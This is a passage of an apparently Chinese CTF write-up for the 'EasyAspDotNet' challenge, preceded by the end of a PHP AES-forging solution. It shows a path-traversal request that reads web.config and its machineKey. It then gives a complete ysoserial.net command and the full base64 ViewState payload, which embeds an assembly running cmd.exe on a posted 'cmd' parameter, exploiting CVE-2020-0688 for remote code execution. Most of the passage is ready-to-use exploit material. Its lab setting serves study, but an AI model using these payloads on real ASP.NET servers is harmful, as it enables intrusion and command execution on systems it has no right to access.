+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$data = <span class="string">''</span>;</span><br><span class="line">$method = <span class="string">'AES-128-CBC'</span>;</span><br><span class="line">$key = <span class="string">'y1ng'</span>;</span><br><span class="line">$iv = md5(<span class="string">'174.0.222.75'</span>, <span class="keyword">true</span>);</span><br><span class="line">$result = base64_encode(openssl_encrypt($data, $method, $key, OPENSSL_RAW_DATA,$iv));</span><br><span class="line">var_dump($result);<span class="comment">//$result=70klfZeYC+WlC045CcKhtg==</span></span><br></pre></td></tr></table></figure>
+<p>最后抓包删除<code>cookie</code>中<code>phpsessid</code>，并<code>GET decrypt=70klfZeYC+WlC045CcKhtg==</code>(这里传参时把特殊符号<code>url</code>编码) getflag。</p>
+</li>
+</ul>
+<h3 id="EasyAspDotNet"><a href="#EasyAspDotNet" class="headerlink" title="EasyAspDotNet"></a>EasyAspDotNet</h3><p>这道题刚开始没注意，(因为不会<code>asp</code>，orz….)<br>后面提示<code>web.config</code>,尝试包含</p>
+<ul>
+<li><code>curl http://5f38752e-2054-41ce-8b5d-dfb67298779a.node3.buuoj.cn/ImgLoad.aspx?path=../../web.config</code></li>
+</ul>
+<p><code>web.config</code><br> <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">system.web</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">machineKey</span> <span class="attr">validationKey</span>=<span class="string">"47A7D23AF52BEF07FB9EE7BD395CD9E19937682ECB288913CE758DE5035CF40DC4DB2B08479BF630CFEAF0BDFEE7242FC54D89745F7AF77790A4B5855A08EAC9"</span> <span class="attr">decryptionKey</span>=<span class="string">"B0E528C949E59127E7469C9AF0764506BAFD2AB8150A75A5"</span> <span class="attr">validation</span>=<span class="string">"SHA1"</span> <span class="attr">decryption</span>=<span class="string">"3DES"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">system.web</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure><br>经过搜索知道，这道题原来是<code>CVE-2020-0688</code>，<code>ASP.NET VIEWSTATE</code>反序列化漏洞。</p>
+<ul>
+<li>利用<code>glzjin</code>师傅的推送的<a href="https://devco.re/blog/2020/03/11/play-with-dotnet-viewstate-exploit-and-create-fileless-webshell/" target="_blank" rel="noopener">文章</a>,还有<code>41yf1sh</code>的这篇<a href="https://www.4hou.com/posts/N54v" target="_blank" rel="noopener">文章</a><br>复现漏洞，并rce</li>
+</ul>
+<p>具体步骤</p>
+<ul>
+<li><p>首先搜集:</p>
+<blockquote>
+<p>1,–validationkey =<br>2,–validationalg =<br>3,–generator = </p>
+</blockquote>
+</li>
+<li><p><code>--validationkey</code>和<code>--validationalg</code>我们已经在<code>web.config</code>已得知，<code>--generator</code>我们在源码中找到<code>CA0B0334</code></p>
+</li>
+<li><p>使用ysoserial.net生成ViewState Payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ysoserial.exe -p ViewState -g ActivitySurrogateSelectorFromFile -c &quot;ExploitClass.cs;.&#x2F;System.dll;.&#x2F;System.Web.dll&quot; --generator&#x3D;&quot;CA0B0334&quot; --validationalg&#x3D;&quot;SHA1&quot; --validationkey&#x3D;&quot;47A7D23AF52BEF07FB9EE7BD395CD9E19937682ECB288913CE758DE5035CF40DC4DB2B08479BF630CFEAF0BDFEE7242FC54D89745F7AF77790A4B5855A08EAC9</span><br></pre></td></tr></table></figure></li>
+<li><p>结果</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;wEy7EoAAQAAAP&#x2F;&#x2F;&#x2F;&#x2F;8BAAAAAAAAAAwCAAAATlN5c3RlbS5EYXRhLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OQUBAAAAE1N5c3RlbS5EYXRhLkRhdGFTZXQKAAAAFkRhdGFTZXQuUmVtb3RpbmdGb3JtYXQTRGF0YVNldC5EYXRhU2V0TmFtZRFEYXRhU2V0Lk5hbWVzcGFjZQ5EYXRhU2V0LlByZWZpeBVEYXRhU2V0LkNhc2VTZW5zaXRpdmUSRGF0YVNldC5Mb2NhbGVMQ0lEGkRhdGFTZXQuRW5mb3JjZUNvbnN0cmFpbnRzGkRhdGFTZXQuRXh0ZW5kZWRQcm9wZXJ0aWVzFERhdGFTZXQuVGFibGVzLkNvdW50EERhdGFTZXQuVGFibGVzXzAEAQEBAAAAAgAHH1N5c3RlbS5EYXRhLlNlcmlhbGl6YXRpb25Gb3JtYXQCAAAAAQgBCAICAAAABf3&#x2F;&#x2F;&#x2F;8fU3lzdGVtLkRhdGEuU2VyaWFsaXphdGlvbkZvcm1hdAEAAAAHdmFsdWVfXwAIAgAAAAEAAAAGBAAAAAAJBAAAAAkEAAAAAAkEAAAACgEAAAAJBQAAAA8FAAAAfCMAAAIAAQAAAP&#x2F;&#x2F;&#x2F;&#x2F;8BAAAAAAAAAAQBAAAAf1N5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljLkxpc3RgMVtbU3lzdGVtLk9iamVjdCwgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0DAAAABl9pdGVtcwVfc2l6ZQhfdmVyc2lvbgUAAAgICQIAAAAHAAAABwAAABACAAAACAAAAAkDAAAACQQAAAAJBQAAAAkGAAAACQcAAAAJCAAAAAkJAAAACgwKAAAAYVN5c3RlbS5Xb3JrZmxvdy5Db21wb25lbnRNb2RlbCwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPTMxYmYzODU2YWQzNjRlMzUFAwAAAGpTeXN0ZW0uV29ya2Zsb3cuQ29tcG9uZW50TW9kZWwuU2VyaWFsaXphdGlvbi5BY3Rpdml0eVN1cnJvZ2F0ZVNlbGVjdG9yK09iamVjdFN1cnJvZ2F0ZStPYmplY3RTZXJpYWxpemVkUmVmAgAAAAR0eXBlC21lbWJlckRhdGFzAwUfU3lzdGVtLlVuaXR5U2VyaWFsaXphdGlvbkhvbGRlcgoAAAAJCwAAAAkMAAAAAQQAAAADAAAACQ0AAAAJDgAAAAEFAAAAAwAAAAkPAAAACRAAAAABBgAAAAMAAAAJEQAAAAkSAAAAAQcAAAADAAAACRMAAAAJFAAAAAEIAAAAAwAAAAkVAAAACRYAAAAECQAAABxTeXN0ZW0uQ29sbGVjdGlvbnMuSGFzaHRhYmxlBwAAAApMb2FkRmFjdG9yB1ZlcnNpb24IQ29tcGFyZXIQSGFzaENvZGVQcm92aWRlcghIYXNoU2l6ZQRLZXlzBlZhbHVlcwAAAwMABQULCBxTeXN0ZW0uQ29sbGVjdGlvbnMuSUNvbXBhcmVyJFN5c3RlbS5Db2xsZWN0aW9ucy5JSGFzaENvZGVQcm92aWRlcgjsUTg&#x2F;AgAAAAoKAwAAAAkXAAAACRgAAAAECwAAAB9TeXN0ZW0uVW5pdHlTZXJpYWxpemF0aW9uSG9sZGVyAwAAAAREYXRhCVVuaXR5VHlwZQxBc3NlbWJseU5hbWUBAAEIBhkAAAD4AVN5c3RlbS5MaW5xLkVudW1lcmFibGUrV2hlcmVTZWxlY3RMaXN0SXRlcmF0b3JgMltbU3lzdGVtLkJ5dGVbXSwgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XSxbU3lzdGVtLlJlZmxlY3Rpb24uQXNzZW1ibHksIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV1dBAAAAAYaAAAATlN5c3RlbS5Db3JlLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4ORAMAAAABwAAAAkbAAAACgkcAAAACR0AAAAICAAAAAAKCAgBAAAAAQ0AAAALAAAABh4AAAD4AVN5c3RlbS5MaW5xLkVudW1lcmFibGUrPFNlbGVjdE1hbnlJdGVyYXRvcj5kX18xN2AyW1tTeXN0ZW0uUmVmbGVjdGlvbi5Bc3NlbWJseSwgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XSxbU3lzdGVtLlR5cGUsIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV1dBAAAAAkaAAAAEA4AAAAJAAAACAj+&#x2F;&#x2F;&#x2F;&#x2F;CggIAQAAAAoJAwAAAAoJIQAAAA0CAQ8AAAALAAAABiIAAADvAVN5c3RlbS5MaW5xLkVudW1lcmFibGUrV2hlcmVTZWxlY3RFbnVtZXJhYmxlSXRlcmF0b3JgMltbU3lzdGVtLlR5cGUsIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV0sW1N5c3RlbS5PYmplY3QsIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV1dBAAAAAkaAAAAEBAAAAAHAAAACQQAAAAKCSUAAAAKCAgAAAAACggIAQAAAAERAAAACwAAAAYmAAAAKVN5c3RlbS5XZWIuVUkuV2ViQ29udHJvbHMuUGFnZWREYXRhU291cmNlBAAAAAYnAAAATVN5c3RlbS5XZWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iMDNmNWY3ZjExZDUwYTNhEBIAAAAHAAAACQUAAAAICAAAAAAICAoAAAAIAQAIAQAIAQAICAAAAAABEwAAAAsAAAAGKQAAAClTeXN0ZW0uQ29tcG9uZW50TW9kZWwuRGVzaWduLkRlc2lnbmVyVmVyYgQAAAAGKgAAAElTeXN0ZW0sIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5EBQAAAAFAAAADQIJKwAAAAgIAwAAAAkIAAAAARUAAAALAAAABi0AAAA0U3lzdGVtLlJ1bnRpbWUuUmVtb3RpbmcuQ2hhbm5lbHMuQWdncmVnYXRlRGljdGlvbmFyeQQAAAAGLgAAAEttc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODkQFgAAAAEAAAAJBgAAABAXAAAAAgAAAAkHAAAACQcAAAAQGAAAAAIAAAAGMQAAAAAJMQAAAAQbAAAAf1N5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljLkxpc3RgMVtbU3lzdGVtLkJ5dGVbXSwgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0DAAAABl9pdGVtcwVfc2l6ZQhfdmVyc2lvbgMAAA9TeXN0ZW0uQnl0ZVtdW10ICAkyAAAAAQAAAAEAAAAEHAAAACJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyAgAAAAhEZWxlZ2F0ZQdtZXRob2QwAwMwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXphdGlvbkhvbGRlcitEZWxlZ2F0ZUVudHJ5L1N5c3RlbS5SZWZsZWN0aW9uLk1lbWJlckluZm9TZXJpYWxpemF0aW9uSG9sZGVyCTMAAAAJNAAAAAQdAAAAigFTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5MaXN0YDErRW51bWVyYXRvcltbU3lzdGVtLkJ5dGVbXSwgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0EAAAABGxpc3QFaW5kZXgHdmVyc2lvbgdjdXJyZW50AwAAB39TeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5MaXN0YDFbW1N5c3RlbS5CeXRlW10sIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV1dCAgCCgAAAAAAAAAACgEhAAAAHAAAAAk1AAAACTYAAAABJQAAABwAAAAJNwAAAAk4AAAAASsAAAADAAAACTkAAAAJOgAAAAcyAAAAAQEAAAAEAAAABwIJOwAAAAoKCgQzAAAAMFN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xkZXIrRGVsZWdhdGVFbnRyeQcAAAAEdHlwZQhhc3NlbWJseQZ0YXJnZXQSdGFyZ2V0VHlwZUFzc2VtYmx5DnRhcmdldFR5cGVOYW1lCm1ldGhvZE5hbWUNZGVsZWdhdGVFbnRyeQEBAgEBAQMwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXphdGlvbkhvbGRlcitEZWxlZ2F0ZUVudHJ5BjwAAADVAVN5c3RlbS5GdW5jYDJbW1N5c3RlbS5CeXRlW10sIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV0sW1N5c3RlbS5SZWZsZWN0aW9uLkFzc2VtYmx5LCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXQkuAAAACgkuAAAABj4AAAAaU3lzdGVtLlJlZmxlY3Rpb24uQXNzZW1ibHkGPwAAAARMb2FkCgQ0AAAAL1N5c3RlbS5SZWZsZWN0aW9uLk1lbWJlckluZm9TZXJpYWxpemF0aW9uSG9sZGVyBwAAAAROYW1lDEFzc2VtYmx5TmFtZQlDbGFzc05hbWUJU2lnbmF0dXJlClNpZ25hdHVyZTIKTWVtYmVyVHlwZRBHZW5lcmljQXJndW1lbnRzAQEBAQEAAwgNU3lzdGVtLlR5cGVbXQk&#x2F;AAAACS4AAAAJPgAAAAZCAAAAJ1N5c3RlbS5SZWZsZWN0aW9uLkFzc2VtYmx5IExvYWQoQnl0ZVtdKQZDAAAALlN5c3RlbS5SZWZsZWN0aW9uLkFzc2VtYmx5IExvYWQoU3lzdGVtLkJ5dGVbXSkIAAAACgE1AAAAMwAAAAZEAAAAzAJTeXN0ZW0uRnVuY2AyW1tTeXN0ZW0uUmVmbGVjdGlvbi5Bc3NlbWJseSwgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XSxbU3lzdGVtLkNvbGxlY3Rpb25zLkdlbmVyaWMuSUVudW1lcmFibGVgMVtbU3lzdGVtLlR5cGUsIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV1dLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXQkuAAAACgkuAAAACT4AAAAGRwAAAAhHZXRUeXBlcwoBNgAAADQAAAAJRwAAAAkuAAAACT4AAAAGSgAAABhTeXN0ZW0uVHlwZVtdIEdldFR5cGVzKCkGSwAAABhTeXN0ZW0uVHlwZVtdIEdldFR5cGVzKCkIAAAACgE3AAAAMwAAAAZMAAAAxgFTeXN0ZW0uRnVuY2AyW1tTeXN0ZW0uVHlwZSwgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XSxbU3lzdGVtLk9iamVjdCwgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0JLgAAAAoJLgAAAAZOAAAAEFN5c3RlbS5BY3RpdmF0b3IGTwAAAA5DcmVhdGVJbnN0YW5jZQoBOAAAADQAAAAJTwAAAAkuAAAACU4AAAAGUgAAAClTeXN0ZW0uT2JqZWN0IENyZWF0ZUluc3RhbmNlKFN5c3RlbS5UeXBlKQZTAAAAKVN5c3RlbS5PYmplY3QgQ3JlYXRlSW5zdGFuY2UoU3lzdGVtLlR5cGUpCAAAAAoBOQAAAAsAAAAGVAAAACZTeXN0ZW0uQ29tcG9uZW50TW9kZWwuRGVzaWduLkNvbW1hbmRJRAQAAAAJKgAAABA6AAAAAgAAAAlWAAAACAgAIAAADzsAAAAAEAAAAk1akAADAAAABAAAAP&#x2F;&#x2F;AAC4AAAAAAAAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIAAAAAOH7oOALQJzSG4AUzNIVRoaXMgcHJvZ3JhbSBjYW5ub3QgYmUgcnVuIGluIERPUyBtb2RlLg0NCiQAAAAAAAAAUEUAAEwBAwDS43ZeAAAAAAAAAADgAAIhCwELAAAIAAAABgAAAAAAAN4mAAAAIAAAAEAAAAAAABAAIAAAAAIAAAQAAAAAAAAABAAAAAAAAAAAgAAAAAIAAAAAAAADAECFAAAQAAAQAAAAABAAABAAAAAAAAAQAAAAAAAAAAAAAACMJgAATwAAAABAAACoAgAAAAAAAAAAAAAAAAAAAAAAAABgAAAMAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACAAAAgAAAAAAAAAAAAAAAggAABIAAAAAAAAAAAAAAAudGV4dAAAAOQGAAAAIAAAAAgAAAACAAAAAAAAAAAAAAAAAAAgAABgLnJzcmMAAACoAgAAAEAAAAAEAAAACgAAAAAAAAAAAAAAAAAAQAAAQC5yZWxvYwAADAAAAABgAAAAAgAAAA4AAAAAAAAAAAAAAAAAAEAAAEIAAAAAAAAAAAAAAAAAAAAAwCYAAAAAAABIAAAAAgAFADAhAABcBQAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAbMAMAwwAAAAEAABECKAMAAAooBAAACgoGbwUAAApvBgAACgZvBwAACm8IAAAKcwkAAAoLB28KAAAKcgEAAHBvCwAACgZvDAAACm8NAAAKchEAAHBvDgAACgwHbwoAAApyGQAAcAgoDwAACm8QAAAKB28KAAAKF28RAAAKB28KAAAKF28SAAAKB28KAAAKFm8TAAAKB28UAAAKJgdvFQAACm8WAAAKDQZvBwAACglvFwAACt4DJt4ABm8HAAAKbxgAAAoGbwcAAApvGQAACioAARAAAAAAIgCHqQADDgAAAUJTSkIBAAEAAAAAAAwAAAB2NC4wLjMwMzE5AAAAAAUAbAAAALwBAAAjfgAAKAIAAHACAAAjU3RyaW5ncwAAAACYBAAAJAAAACNVUwC8BAAAEAAAACNHVUlEAAAAzAQAAJAAAAAjQmxvYgAAAAAAAAACAAABRxQCAAkAAAAA+iUzABYAAAEAAAAOAAAAAgAAAAEAAAAZAAAAAgAAAAEAAAABAAAAAwAAAAAACgABAAAAAAAGACkAIgAGAFYANgAGAHYANgAKAKgAnQAKAMAAnQAKAOgAnQAOABsBCAEOACMBCAEKAE8BnQAOAIYBZwEGAKwBIgAGACECFwIGAEECFwIGAGYCIgAAAAAAAQAAAAAAAQABAAAAEAAXAAAABQABAAEAUCAAAAAAhhgwAAoAAQARADAADgAZADAACgAJADAACgAhALQAHAAhANIAIQApAN0ACgAhAPUAJgAxAAIBCgA5ADAACgA5ADQBKwBBAEIBMAAhAFsBNQBJAJoBOgBRAKMBPwBZALMBRABBALoBMABBAMgBSgBBAOMBSgBBAP0BSgA5ABECTwA5AC4CUwBpAEwCWAAxAFYCMAAxAFwCCgAxAGICCgAuAAsAZQAuABMAbgBcAASAAAAAAAAAAAAAAAAAAAAAAJQAAAAEAAAAAAAAAAAAAAABABkAAAAAAAQAAAAAAAAAAAAAABMAnQAAAAAABAAAAAAAAAAAAAAAAQAiAAAAAAAAAAA8TW9kdWxlPgBkZ3BrNXJsNS5kbGwARQBtc2NvcmxpYgBTeXN0ZW0AT2JqZWN0AC5jdG9yAFN5c3RlbS5SdW50aW1lLkNvbXBpbGVyU2VydmljZXMAQ29tcGlsYXRpb25SZWxheGF0aW9uc0F0dHJpYnV0ZQBSdW50aW1lQ29tcGF0aWJpbGl0eUF0dHJpYnV0ZQBkZ3BrNXJsNQBTeXN0ZW0uV2ViAEh0dHBDb250ZXh0AGdldF9DdXJyZW50AEh0dHBTZXJ2ZXJVdGlsaXR5AGdldF9TZXJ2ZXIAQ2xlYXJFcnJvcgBIdHRwUmVzcG9uc2UAZ2V0X1Jlc3BvbnNlAENsZWFyAFN5c3RlbS5EaWFnbm9zdGljcwBQcm9jZXNzAFByb2Nlc3NTdGFydEluZm8AZ2V0X1N0YXJ0SW5mbwBzZXRfRmlsZU5hbWUASHR0cFJlcXVlc3QAZ2V0X1JlcXVlc3QAU3lzdGVtLkNvbGxlY3Rpb25zLlNwZWNpYWxpemVkAE5hbWVWYWx1ZUNvbGxlY3Rpb24AZ2V0X0Zvcm0AZ2V0X0l0ZW0AU3RyaW5nAENvbmNhdABzZXRfQXJndW1lbnRzAHNldF9SZWRpcmVjdFN0YW5kYXJkT3V0cHV0AHNldF9SZWRpcmVjdFN0YW5kYXJkRXJyb3IAc2V0X1VzZVNoZWxsRXhlY3V0ZQBTdGFydABTeXN0ZW0uSU8AU3RyZWFtUmVhZGVyAGdldF9TdGFuZGFyZE91dHB1dABUZXh0UmVhZGVyAFJlYWRUb0VuZABXcml0ZQBGbHVzaABFbmQARXhjZXB0aW9uAAAPYwBtAGQALgBlAHgAZQAAB2MAbQBkAAAHLwBjACAAAAAAAFPrEJ4OwFZKu3aYOkFG4&#x2F;oACLd6XFYZNOCJAyAAAQQgAQEICLA&#x2F;X38R1Qo6BAAAEhEEIAASFQQgABIZBCAAEiEEIAEBDgQgABIlBCAAEikEIAEODgUAAg4ODgQgAQECAyAAAgQgABIxAyAADggHBBIREh0ODggBAAgAAAAAAB4BAAEAVAIWV3JhcE5vbkV4Y2VwdGlvblRocm93cwEAAAC0JgAAAAAAAAAAAADOJgAAACAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAwCYAAAAAAAAAAAAAAABfQ29yRGxsTWFpbgBtc2NvcmVlLmRsbAAAAAAA&#x2F;yUAIAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEAEAAAABgAAIAAAAAAAAAAAAAAAAAAAAEAAQAAADAAAIAAAAAAAAAAAAAAAAAAAAEAAAAAAEgAAABYQAAATAIAAAAAAAAAAAAATAI0AAAAVgBTAF8AVgBFAFIAUwBJAE8ATgBfAEkATgBGAE8AAAAAAL0E7&#x2F;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&#x2F;OpgYOnebs0UrRhI&#x3D;</span><br></pre></td></tr></table></figure></li>
+<li><p>进行一次<code>url</code>编码,抓包传给<code>__VIEWSTATE</code>，并继续传入一个参数为<code>cmd</code>来RCE。</p>
+</li>
+<li><p>flag在<code>c</code>盘下的<code>Fl@g_glzjin_still_w@nts_a_girl_friend.txt</code>文件内，读取getflag。</p>
+</li>
+</ul>
